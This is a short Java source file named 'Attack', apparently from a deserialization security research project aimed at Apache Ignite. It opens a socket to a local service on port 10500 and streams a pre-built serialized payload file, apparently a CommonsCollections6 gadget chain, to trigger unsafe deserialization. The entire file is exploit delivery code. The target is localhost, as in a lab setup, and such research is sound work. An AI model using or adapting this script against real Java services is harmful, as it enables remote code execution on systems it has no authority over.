package org.su18.serialize.ignite;

import java.io.BufferedWriter;
import java.io.FileInputStream;
import java.io.OutputStream;
import java.io.OutputStreamWriter;
import java.net.Socket;

/**
 * @author su18
 */
public class Attack {


	public static void writeString(OutputStream outputStream, String string) throws Exception {
		OutputStreamWriter writer = new OutputStreamWriter(outputStream);
		BufferedWriter     bw     = new BufferedWriter(writer);
		bw.write(string);
		bw.flush();
	}

	public static void writeStream(OutputStream outputStream, String file) throws Exception {
		FileInputStream fis = new FileInputStream(file);
		byte[] b = new byte[1024];
		while (fis.read(b) != -1) {
			outputStream.write(b);
		}
		outputStream.flush();
	}

	public static void main(String[] args) throws Exception {
		Socket socket = new Socket("127.0.0.1", 10500);
		// 向服务端程序发送数据
		OutputStream outputStream = socket.getOutputStream();
		writeStream(outputStream,"CC6WithHashSet.bin");
		socket.close();
	}
}
